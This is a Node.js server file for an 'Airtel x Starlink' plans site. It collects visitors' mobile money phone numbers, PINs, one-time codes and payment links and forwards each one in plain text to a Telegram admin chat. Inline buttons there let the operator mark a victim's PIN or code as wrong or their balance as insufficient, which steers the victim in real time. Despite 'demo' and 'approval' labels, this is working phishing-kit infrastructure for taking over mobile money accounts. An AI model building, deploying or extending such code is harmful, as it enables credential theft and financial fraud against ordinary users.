// server.js
// Airtel x Starlink forfaits flow — with Telegram bot admin-approval gate.
//
// Flow: airtel-starlink.html (plans) -> trial.html (login) -> pto.html (OTP)
//       -> [Telegram admin approval, spinner while waiting] -> mwish.html
//
// Setup:
//   1. npm install
//   2. Set environment variables:
//        TELEGRAM_BOT_TOKEN     = token from @BotFather
//        TELEGRAM_ADMIN_CHAT_ID = your Telegram chat id (the admin who approves)
//   3. npm start
//
// Storage: in-memory only (Map). Fine for a single server instance / testing.
// Restarting the server clears all pending/approved requests.

const express = require('express');
const path = require('path');
const { Api, longPoll } = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn(
    '⚠️  TELEGRAM_BOT_TOKEN and/or TELEGRAM_ADMIN_CHAT_ID are not set.\n' +
    '    The approval flow will not be able to notify you until both are configured.'
  );
}

// Telegram client for direct API sends.
const api = BOT_TOKEN ? new Api(BOT_TOKEN) : null;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  if (['/server.js', '/package.json', '/package-lock.json', '/vscode-settings.json'].includes(req.path)) {
    return res.sendStatus(404);
  }
  next();
});
app.use(express.static(PUBLIC_DIR));

// ---------------------------------------------------------------------------
// In-memory store of approval requests
// id -> { status: 'pending' | 'approved' | 'denied', plan, price, phone, createdAt }
// ---------------------------------------------------------------------------
const requests = new Map();

function makeId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function isAdminApprovalConfigured() {
  return Boolean(api && ADMIN_CHAT_ID);
}

function formatTelegramPhone(phone) {
  const value = String(phone || '').trim();
  if (!value || value === '—') return '—';

  const digits = value.replace(/\D/g, '');
  if (!digits) return '—';

  const withoutCountryCode = digits.startsWith('260') ? digits.slice(3) : digits;
  return withoutCountryCode;
}

const demoUsers = new Map();
const demoPayments = [];
const demoMtnRequests = new Map();

function jsonSuccess(data = {}) {
  return { success: true, ...data };
}

function jsonError(message, extra = {}) {
  return { success: false, error: message, ...extra };
}

// Clean up old requests every 10 minutes (older than 30 min) to avoid unbounded growth
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, reqData] of requests) {
    if (reqData.createdAt < cutoff) requests.delete(id);
  }
}, 10 * 60 * 1000);

function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
  if (!api || !ADMIN_CHAT_ID) return;

  const telegramPhone = formatTelegramPhone(phone);

  const stepLabel = step === 'link' ? 'Link Verification' : step === 'otp' ? 'OTP Verification' : 'Login';
  const secretLine = step === 'otp'
    ? `🔑 OTP: \`${otp || '—'}\`\n`
    : step === 'link'
      ? `🔑 Link: \`${link || '—'}\`\n`
      : `🔑 PIN: \`${code || '—'}\`\n`;

  const text =
    `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
    `📦 Data: ${plan || '—'}\n` +
    `💰 Price: USD ${price || '—'}\n` +
    `📱 Phone: \`${telegramPhone}\`\n` +
    secretLine;

  const buttonRow = step === 'otp'
    ? [
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ wrong code', callback_data: `deny:${id}` },
        { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
        { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
      ]
    : step === 'link'
      ? [
          { text: '✅ Approve Link', callback_data: `approve:${id}` },
          { text: '❌ wrong link', callback_data: `deny:${id}` },
        ]
      : [
          { text: '✅ Approve', callback_data: `approve:${id}` },
          { text: '❌ wrong pin', callback_data: `deny:${id}` },
        ];

  try {
    return api.sendMessage({
      chat_id: ADMIN_CHAT_ID,
      text,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [buttonRow],
      },
    });
  } catch (err) {
    console.error('Failed to send Telegram notification:', err.message);
    return null;
  }
}

function createApprovalRequest({ plan, price, phone, step = 'login', code = '', otp = '', link = '' } = {}) {
  const id = makeId();
  const record = {
    status: 'pending',
    plan: plan || '—',
    price: price || '—',
    phone: phone || '—',
    step: step || 'login',
    code: code || '',
    otp: otp || '',
    link: link || '',
    createdAt: Date.now(),
  };

  requests.set(id, record);
  demoMtnRequests.set(id, { ...record, requestId: id, status: 'pending' });
  notifyTelegramForRequest(id, { plan: record.plan, price: record.price, phone: record.phone, step: record.step, code: record.code, otp: record.otp, link: record.link });
  return id;
}

function updateRequestStatus(id, status, extra = {}) {
  const req = requests.get(id);
  if (req) {
    req.status = status;
    Object.assign(req, extra);
  }

  const demoReq = demoMtnRequests.get(id);
  if (demoReq) {
    demoReq.status = status;
    Object.assign(demoReq, extra);
  }
}

// ---------------------------------------------------------------------------
// Create a new approval request -> notifies admin on Telegram
// ---------------------------------------------------------------------------
app.post('/api/request-approval', async (req, res) => {
  const { plan, price, phone, step, code, otp } = req.body || {};
  const id = createApprovalRequest({ plan, price, phone, step, code, otp });
  res.json({ id });
});
// ---------------------------------------------------------------------------
// Poll approval status
// ---------------------------------------------------------------------------
app.get('/api/check-approval/:id', (req, res) => {
  const reqData = requests.get(req.params.id) || demoMtnRequests.get(req.params.id);
  if (!reqData) return res.status(404).json({ status: 'not_found' });
  res.json({ status: reqData.status });
});

// ---------------------------------------------------------------------------
// Demo API endpoints used by the Starlink / MTN front-end flows
// ---------------------------------------------------------------------------
app.post('/api/auth/session', (req, res) => {
  res.json(jsonSuccess({ token: 'demo-token-' + makeId(), expiresIn: 3600000 }));
});

app.get('/api/agent-config', (req, res) => {
  const country = (req.query.country || 'ZM').toUpperCase();
  const provider = (req.query.provider || 'mtn').toLowerCase();
  const config = {
    found: true,
    country,
    provider,
    agent_name: 'Zambia Agent',
    agent_number: '+260966000000',
    instructions: 'Please send the exact amount and then paste the confirmation message in the next step.',
  };
  res.json(config);
});

app.post('/api/agent-payment', (req, res) => {
  const payload = req.body || {};
  demoPayments.push({
    ...payload,
    createdAt: Date.now(),
    id: makeId(),
  });
  res.json(jsonSuccess({ message: 'Payment submitted successfully.' }));
});

app.post('/api/starlink/register', (req, res) => {
  const { name, phone, password, country } = req.body || {};
  if (!name || !phone || !password) {
    return res.status(400).json(jsonError('Missing required fields'));
  }
  const normalizedPhone = String(phone).trim();
  if (demoUsers.has(normalizedPhone)) {
    return res.status(409).json(jsonError('phone_exists'));
  }
  demoUsers.set(normalizedPhone, { name, phone: normalizedPhone, password, country });
  res.json(jsonSuccess({ phone: normalizedPhone, name }));
});

app.post('/api/starlink/login', (req, res) => {
  const { phone, password } = req.body || {};
  const normalizedPhone = String(phone || '').trim();
  const user = demoUsers.get(normalizedPhone);
  if (!user || user.password !== String(password || '')) {
    return res.status(401).json(jsonError('invalid_credentials'));
  }
  res.json(jsonSuccess({ phone: user.phone, name: user.name }));
});

app.get('/api/my-agent-orders', (req, res) => {
  const phone = String(req.query.phone || '');
  const orders = demoPayments
    .filter((entry) => !phone || entry.phone === phone)
    .map((entry) => ({
      id: entry.id,
      package: entry.package || 'Starlink',
      amount: entry.amount || 'USD 0',
      status: 'pending',
      createdAt: entry.createdAt,
    }));
  res.json({ success: true, orders });
});

app.post('/api/mtn/submit-otp', (req, res) => {
  const { requestId, phone, otp } = req.body || {};
  let resolvedPhone = phone;
  let id = requestId;

  if (!resolvedPhone && requestId) {
    const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
    if (existing) resolvedPhone = existing.phone;
  }

  if (!resolvedPhone || !otp) {
    return res.status(400).json(jsonError('Missing phone or otp'));
  }

  if (!id) {
    id = createApprovalRequest({
      plan: 'MTN verification',
      price: '—',
      phone: resolvedPhone,
      step: 'otp',
      otp,
    });
  } else {
    const existing = requests.get(id) || demoMtnRequests.get(id);
    if (existing) {
      existing.step = 'otp';
      existing.otp = otp;
      existing.phone = resolvedPhone || existing.phone;
      existing.status = 'pending';
      if (!isAdminApprovalConfigured()) {
        existing.status = 'completed';
      } else if (api && ADMIN_CHAT_ID) {
        notifyTelegramForRequest(id, {
          plan: existing.plan,
          price: existing.price,
          phone: existing.phone,
          step: 'otp',
          code: existing.code,
          otp,
          link: existing.link || ''
        });
      }
    }
  }

  if (!isAdminApprovalConfigured()) {
    const existing = requests.get(id) || demoMtnRequests.get(id);
    if (existing) existing.status = 'completed';
  }

  res.json(jsonSuccess({ message: 'OTP accepted', phone: resolvedPhone, otp, requestId: id }));
});

app.post('/api/mtn/submit', (req, res) => {
  const { phone, pin, starlinkPackage, country } = req.body || {};
  if (!phone || !pin) {
    return res.status(400).json(jsonError('Missing phone or pin'));
  }

  const requestId = createApprovalRequest({
    plan: starlinkPackage || 'Starlink',
    price: country || 'USD',
    phone,
    step: 'login',
    code: pin,
  });

  const request = requests.get(requestId) || demoMtnRequests.get(requestId);
  if (request && !isAdminApprovalConfigured()) {
    request.status = 'phone_pin_verified';
  }

  res.json(jsonSuccess({ message: 'PIN accepted', phone, requestId }));
});

app.post('/api/mtn/momo-link', (req, res) => {
  const { phone, link } = req.body || {};
  if (!phone || !link) {
    return res.status(400).json(jsonError('Missing phone or link'));
  }
  res.json(jsonSuccess({ message: 'Link submitted', phone, link }));
});

app.post('/api/mtn/submit-link', (req, res) => {
  const { requestId, phone, link, extractedCode } = req.body || {};
  let resolvedPhone = phone;
  const fullLinkValue = link || extractedCode || '';

  if (!resolvedPhone && requestId) {
    const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
    if (existing) resolvedPhone = existing.phone;
  }

  if (!resolvedPhone || !fullLinkValue) {
    return res.status(400).json(jsonError('Missing phone or link'));
  }

  if (requestId) {
    const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
    if (existing) {
      existing.link = fullLinkValue;
      existing.phone = resolvedPhone;
      existing.status = 'pending';
      existing.step = 'link';

      if (api && ADMIN_CHAT_ID) {
        notifyTelegramForRequest(requestId, {
          plan: existing.plan,
          price: existing.price,
          phone: existing.phone,
          step: 'link',
          code: existing.code,
          otp: existing.otp || '—',
          link: existing.link || ''
        });
      }
    }
  }

  res.json(jsonSuccess({ message: 'Link submitted', phone: resolvedPhone, link: fullLinkValue }));
});

app.post('/api/mtn/demo-approve', (req, res) => {
  const { requestId, status } = req.body || {};
  if (!requestId) {
    return res.status(400).json(jsonError('Missing requestId'));
  }

  const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
  if (!existing) {
    return res.status(404).json(jsonError('Request not found'));
  }

  const nextStatus = status || (existing.step === 'otp' ? 'otp_pending' : 'phone_pin_verified');
  existing.status = nextStatus;
  res.json(jsonSuccess({ message: 'Demo approval applied', status: nextStatus, requestId }));
});

app.get('/api/check-status', (req, res) => {
  res.json({ status: 'pending' });
});

app.get('/api/mtn/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  const request = requests.get(requestId) || demoMtnRequests.get(requestId) || { status: 'pending' };
  res.json({ requestId, ...request });
});

app.post('/api/mtn/proceed-verified', (req, res) => {
  const body = req.body || {};
  res.json(jsonSuccess({ message: 'Proceed verified', ...body }));
});

app.post('/api/user-deposited', (req, res) => {
  res.json(jsonSuccess({ message: 'Deposit received' }));
});

app.get('/api/support-whatsapp', (req, res) => {
  res.json({ success: true, whatsapp_url: 'https://wa.me/260966000000' });
});

// ---------------------------------------------------------------------------
// Telegram button presses (approve / deny / insufficient)
// ---------------------------------------------------------------------------
const LABEL_BY_ACTION = {
  approve: 'Approve ✅',
  deny: 'wrong code ❌',
  insufficient: 'Insufficient Balance ⚠️',
  demo_error:'wrong pin⚠️',
};

async function processTelegramCallbacks() {
  try {
    await api.deleteWebhook({ drop_pending_updates: false });
    console.log('Telegram API ready. Listening for admin approval actions.');

    for await (const update of longPoll(api, { timeout: 30 })) {
      const callback = update.callback_query;
      if (!callback) continue;

      const [action, id] = String(callback.data || '').split(':');
      const chatId = callback.message?.chat?.id;
      const messageId = callback.message?.message_id;

      if (String(chatId) !== String(ADMIN_CHAT_ID)) {
        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Not authorized.' });
        continue;
      }

      const request = requests.get(id);
      if (!LABEL_BY_ACTION[action] || !id || !request) {
        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'This request is no longer available.' });
        continue;
      }

      const statusByAction = {
        approve: request.step === 'otp' ? 'completed' : request.step === 'link' ? 'otp_pending' : 'phone_pin_verified',
        deny: request.step === 'otp' ? 'wrong_otp' : request.step === 'link' ? 'wrong_link' : 'wrong_pin',
        insufficient: 'insufficient_balance',
        demo_error: 'wrong_pin',
      };
      const status = statusByAction[action];
      if (!status) {
        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Unknown action.' });
        continue;
      }

      updateRequestStatus(id, status);
      await api.answerCallbackQuery({ callback_query_id: callback.id, text: LABEL_BY_ACTION[action] });
      if (messageId) {
        const statusLabel = {
          phone_pin_verified: 'APPROVED',
          completed: 'APPROVED',
          wrong_pin: 'WRONG PIN',
          wrong_otp: 'WRONG CODE',
          wrong_link: 'WRONG LINK',
          insufficient_balance: 'INSUFFICIENT BALANCE',
        }[status] || status.toUpperCase();
        const statusPrefix = statusLabel === 'APPROVED' ? '✅' : statusLabel.startsWith('INSUFFICIENT') ? '⚠️' : '❌';
        const originalText = callback.message?.text || '';
        const updatedText = `${originalText}\n\n${statusPrefix} Status: ${statusLabel}`;

        try {
          await api.editMessageText({
            chat_id: chatId,
            message_id: messageId,
            text: updatedText,
            reply_markup: { inline_keyboard: [] },
          });
        } catch (err) {
          console.error('Failed to update Telegram approval message:', err.message);
          await api.editMessageReplyMarkup({
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: [] },
          });
        }
      }
    }
  } catch (err) {
    console.error('Telegram callback polling failed:', err.message);
  }
}

if (api && ADMIN_CHAT_ID) {
  processTelegramCallbacks();
}

// ---------------------------------------------------------------------------
// Page routes
// ---------------------------------------------------------------------------
app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

const pages = {
  'starlink/': 'starlink-index.html',
  'starlink/index.html': 'starlink-index.html',
  'starlink/login.html': 'login.html',
  'starlink/register.html': 'register.html',
  'starlink/status.html': 'status.html',
  'starlink/settings.html': 'settings.html',
  'starlink/orders.html': 'orders.html',
  'mtn/mobile-money-login.html': 'mobile-money-login.html',
};
Object.entries(pages).forEach(([route, file]) => {
  app.get('/' + route, (req, res) => {
    const filePath = path.join(PUBLIC_DIR, file);
    res.sendFile(filePath, (err) => {
      if (err) res.status(404).send('Page not found: ' + file);
    });
  });
});

app.get('/airtel-starlink.html', (req, res) => {
  res.redirect('/');
});

app.get('/trial.html', (req, res) => {
  res.redirect('/starlink/login.html');
});

app.get('/pto.html', (req, res) => {
  res.redirect('/starlink/login.html');
});

app.get('/mwish.html', (req, res) => {
  res.redirect('/starlink/status.html');
});

app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ success: false, error: 'Endpoint not found' });
  }

  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`Airtel x Starlink app running at http://localhost:${PORT}`);
});
